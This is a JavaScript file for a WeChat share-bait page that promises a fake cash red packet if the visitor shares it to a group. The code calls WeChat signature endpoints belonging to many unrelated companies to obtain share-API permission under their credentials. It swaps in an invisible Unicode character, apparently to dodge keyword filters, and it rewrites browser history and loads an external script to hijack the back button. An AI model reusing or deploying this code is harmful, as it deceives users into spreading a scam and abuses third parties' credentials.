  function suning_config() {
    var url = 'https://act.suning.com/act-wap-web/wap/public/getWechatToken.htm?url=' + encodeURIComponent(location.href.split('#')[0]) + '&isAuthorized=true';
    $.ajax({
      type: "GET",
      url: url,
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'cb',
      data: {},
      success: function (d) {
        var config = d;
        jssdk_config(config);
      }
    })
  }

  function hnair_config() {
    var url = 'https://wx.hnair.com/wxoauth/sns/getSignInfo?_=' + (+new Date()) + '&signurl=' + encodeURIComponent(location.href.split('#')[0]);
    $.ajax({
      type: "GET",
      url: url,
      dataType: "jsonp",
      jsonp: "jcb",
      data: {},
      success: function (d) {
        var config = JSON.parse(d);
        jssdk_config(config);
      }
    })
  }

  function ctrip_config() {
    $.ajax({
      type: "GET",
      url: 'https://m.ctrip.com/restapi/soa2/10645/WeChatJSTicket?AppID=wx0a4845e45aaf634a&CurrentURL=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        jssdk_config({
          appId: 'wx0a4845e45aaf634a',
          timestamp: d.timestamp,
          nonceStr: d.noncestr,
          signature: d.signature,
        });
      }
    });
  }

  function rabbitpre_config() {
    $.ajax({
      type: "GET",
      url: 'https://rabbitpre.com/api2/share/signature?pageUrl=' + encodeURIComponent(location.href.split('#')[0]) + '&shareUrl=' + window.data.to_group.link,
      dataType: "json",
      data: {},
      success: function (d) {
        if (d && d.data) {
          jssdk_config(d.data);
        }
      }
    });
  }

  function jssdk_config(config) {
    config['jsApiList'] = ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems'];
    if (M.getParam('debug') === '1') {
      config['debug'] = true;
      alert(config['appId']);
      alert(JSON.stringify(config));
    } else {
      config['debug'] = false;
    }
    wx.config(config);
    wx.ready(function () {
      if (location_host.indexOf('dajie.com') > -1) {
        setTimeout(function () {
          if (location_host.indexOf('dangdang.com') > -1) {} else {
            wx.hideOptionMenu();
          }
          if (M.getParam('debugx') === '1') {
            wx.showMenuItems({
              menuList: [
                'menuItem:share:timeline',
                'menuItem:share:appMessage',
              ]
            });
          } else {
            wx.showMenuItems({
              menuList: ['menuItem:share:appMessage']
            });
          }
          shareFriend(window.data.to_group);
          shareTimeline(window.data.to_timeline);
        }, 200);

        setTimeout(function () {
          if (location_host.indexOf('dangdang.com') > -1) {} else {
            wx.hideOptionMenu();
          }
          if (M.getParam('debugx') === '1') {
            wx.showMenuItems({
              menuList: [
                'menuItem:share:timeline',
                'menuItem:share:appMessage',
              ]
            });
          } else {
            wx.showMenuItems({
              menuList: ['menuItem:share:appMessage']
            });
          }
          shareFriend(window.data.to_group);
          shareTimeline(window.data.to_timeline);
        }, 500);

      } else {
        if (location_host.indexOf('dangdang.com') > -1) {} else {
          wx.hideOptionMenu();
        }
        if (M.getParam('debugx') === '1') {
          wx.showMenuItems({
            menuList: [
              'menuItem:share:timeline',
              'menuItem:share:appMessage',
            ]
          });
        } else {
          wx.showMenuItems({
            menuList: ['menuItem:share:appMessage']
          });
        }
      }

    });

    shareFriend(window.data.to_group);
    shareTimeline(window.data.to_timeline);
  }

  function start_load() {
    var data = window.data;
    if (data.attached['timeline_ad']) timeline_ad = true;
    if (data.attached['group_ad']) group_ad = true;

    if (window.data.attached.signmode === 'jssdk') {
      if (location.host.indexOf('m.ymatou.com') > -1) {
        ymatou_config();
      } else if (location.host.indexOf('my.lotour.com') > -1) {
        lotour_config();
      } else if (location.host.indexOf('wenjuan.com') > -1) {
        wenjuan_config();
      } else if (location_host.indexOf('dangdang.com') > -1) {
        dangdang_config();
      } else if (location_host.indexOf('fang.com') > -1) {
        fang_config();
      } else if (location_host.indexOf('dajie.com') > -1) {
        dajie_config();
      } else if (location_host.indexOf('huajiao.com') > -1) {
        huajiao_config();
      } else if (location_host.indexOf('chinahr.com') > -1) {
        chinahr_config();
      } else if (location_host.indexOf('focus.cn') > -1) {
        focus_config();
      } else if (location_host.indexOf('sina.cn') > -1) {
        sina_config();
      } else if (location_host.indexOf('zcool.com.cn') > -1) {
        zcool_config();
      } else if (location_host.indexOf('163.com') > -1) {
        music_163_config();
      } else if (location_host.indexOf('ifeng.com') > -1) {
        ifeng_config();
      } else if (location_host.indexOf('sogou.com') > -1) {
        //sougou_config();
        map_sogo_config();
      } else if (location_host.indexOf('bama555.com') > -1) {
        bama555_config();
      } else if (location_host.indexOf('amap.com') > -1) {
        amap_config();
      } else if (location_host.indexOf('cyzone.cn') > -1) {
        cyzone_config();
      } else if (location_host.indexOf('jia.com') > -1) {
        jia_config();
      } else if (location_host.indexOf('jumei.com') > -1) {
        jumei_config();
      } else if (location_host.indexOf('ivwen.com') > -1) {
        meipian_config();
      } else if (location_host.indexOf('meipian') > -1) {
        meipian_config();
      } else if (location_host.indexOf('leju.com') > -1 || location_host.indexOf('sina.com.cn') > -1) {
        leju_config();
      } else if (location_host.indexOf('hnair.com') > -1) {
        hnair_config();
      } else if (location_host.indexOf('inke.cn') > -1) {
        inke_config();
      } else if (location_host.indexOf('shijue.me') > -1) {
        shijue_config();
      } else if (location_host.indexOf('netease.com') > -1) {
        nos_config();
      } else if (location_host.indexOf('58che.com') > -1) {
        che_config();
      } else if (location_host.indexOf('douyu.com') > -1) {
        douyu_config();
      } else if (location_host.indexOf('zol.com.cn') > -1) {
        zol_config();
      } else if (location_host.indexOf('seeyouyima.com') > -1) {
        seeyouyima_config();
      } else if (location_host.indexOf('mia.com') > -1) {
        mia_config();
      } else if (location_host.indexOf('sfbest.com') > -1) {
        shunfeng_config();
      } else if (location_host.indexOf('pchome') > -1) {
        pchome_config();
      } else if (location_host.indexOf('weinisongdu.com') > -1) {
        weinisongdu_config();
      } else if (location_host.indexOf('17173.com') > -1) {
        c_17173_config();
        chanyou_config();
      } else if (location_host.indexOf('gzl.cn') > -1) {
        gzl_config();
      } else if (location_host.indexOf('zhiye.com') > -1) {
        zhiye_config();
      } else if (location_host.indexOf('baidu.com') > -1) {
        baidu_config();
      } else if (location_host.indexOf('xinhuanet.com') > -1) {
        xinhuanet_config();
      } else if (location_host.indexOf('haozu.com') > -1) {
        haozu_config();
      } else if (location_host.indexOf('189.cn') > -1) {
        wx189_config();
      } else if (location_host.indexOf('baihe.com') > -1) {
        baihe_config();
      }
      /*else if (location_host.indexOf('rabbitpre.com') > -1) {
             rabbitpre_config();
           } */
      else if (location_host.indexOf('suning.com') > -1) {
        suning_config();
      } else if (location_host.indexOf('kujiale.com') > -1) {
        kujiale_config();
      } else if (location_host.indexOf('mafengwo.cn') > -1) {
        mafengwo_config();
      } else if (location_host.indexOf('hexun.com') > -1) {
        hexun_config();
      } else if (location_host.indexOf('banggo.com') > -1) {
        banggo_config();
      } else if (location_host.indexOf('artron.net') > -1) {
        artron_config();
      } else if (location_host.indexOf('house365.com') > -1) {
        house365_config();
      } else if (location_host.indexOf('ctrip.com') > -1) {
        ctrip_config();
      } else if (location_host.indexOf('rabbitpre.com') > -1) {
        rabbitpre_config();
      } else {
        if (window['g_shareData'] && window['g_shareData']['jssdk']) {
          jssdk_config(g_shareData['jssdk']);
        }
      }
    } else {
      WeixinJSBridge.call('showOptionMenu');
    }
    shareFriend();
    shareTimeline();
  }

  function init() {
    if (typeof WeixinJSBridge === "undefined") {
      if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', start_load, false);
      } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', start_load);
        document.attachEvent('onWeixinJSBridgeReady', start_load);
      }
    } else {
      start_load();
    }
  }

  window.g_share = {
    init: init,
  }

}())

$(function () {

  var config = {
    tpl: {
      body: [
        '<div class="share-container">',
        '  <h3 class="share-container-bg-title">分享点这里</h3>',
        '  <div class="share-prompt">',
        '    <p>',
        '      点击右上角，分享到',
        '      <i class="icon_share"></i>',
        '      <span class="js_share_to_desc">微信群</span>',
        '    </p>',
        '    <p>即可领取￥<span>%(money)</span>￥</p>',
        '  </div>',
        '  <img class="s_i" style="	width: 1px;height: 1px;border-radius: 10%;margin-left: 50%;transform: translateX(-50%);	position: absolute;" src="https://lifescore.oss-cn-qingdao.aliyuncs.com/hb_v2/image/hun_l.png">',
        '  <div class="red-packet">',
        '    <img>',
        '    <p>恭喜发财</p>',
        '  </div>',
        '</div>',
      ].join(''),
    }
  };

  function initPage(money) {
    M.resetFont();
    $(document.body).append(config.tpl.body.jstpl_format({
      money: money
    }));
    $('.red-packet img').attr('src', $('.js_head_img').attr('data-src'));
    $('.share-container').css({
      height: $(window).height() + 'px'
    });
  }

  function bindEvent() {

    document.body.onclick = function () {}

    $('.share-container').on('click', function () {
      if (!window['g_tips_message_obj']) {
        window['g_tips_message_obj'] = gConfig.defaultTips;
      }
      showShareTips(g_tips_message_obj);
    });

    $(document.body).on('event_page_share_done', function () {
      if (gConfig.successTips) {
        g_dialog.alert({
          title: '',
          message: gConfig.successTips,
          btn: '我知道了',
          cb: function () {
            if (gConfig.endPageUrl) {
              location.replace(gConfig.endPageUrl);
            }
            return false
          }
        });
      }
    });

  }

  function replaceMoney(obj, money) {
    obj = obj || {}
    if (obj.title) {
      obj.title = obj.title.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
    }
    if (obj.desc) {
      obj.desc = obj.desc.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace('\\n', '\n').replace(/{bq}/ig, bq);
    }
    if (obj.successTitle) {
      obj.successTitle = obj.successTitle.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
    }
    if (obj.successTips) {
      obj.successTips = obj.successTips.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
    }
  }

  function init() {

    setTimeout(function () {
      //window.history.pushState('page2', '/', "/" + Math["random"]()["toString"](36)["substring"](2) + ".html");
      window.history.pushState('page2', '/', "/");
    }, 100);

    record('tosharer', site);
    evkey && record('tosharer', evkey);

    var moneyStr = parseInt(M.getParam('money')) || parseInt((parseFloat(Math.random() * 20) + 30) * 100)

    var money = (parseFloat(moneyStr / 100).toFixed(2));

    gConfig.defaultTips = gConfig.defaultTips.jstpl_format({
      money: money
    });

    gConfig.successTips = gConfig.successTips.jstpl_format({
      money: money
    });

    replaceMoney(gConfig['ad'], money)
    replaceMoney(gConfig['to_group'], money)
    replaceMoney(gConfig['to_timeline'], money)
    replaceMoney(gConfig['to_timeline'], money)

    $(gConfig.groupTips).each(function (index, item) {
      replaceMoney(item, money)
    });

    $(gConfig.timeLineTips).each(function (index, item) {
      replaceMoney(item, money)
    });

    initPage(money);
    bindEvent();
    g_share.init();
    setTimeout(function () {
      showShareTips(gConfig.defaultTips);
    });
  }

  init();
});

$(function () {
  if (gConfig.hm) {
    M.report(gConfig.hm);
    M.hotClick('pv.share_page');
  }
  // 总统计
  M.loadJS("https://hm.baidu.com/hm.js?46ea4995fb6116f9430b8379f5c18d8c", "async")

});

// 设置返回
$(function () {
  if (gConfig['attached'] && gConfig['attached']['back_api']) {
    M.loadJS(gConfig['attached']['back_api']);
  }
});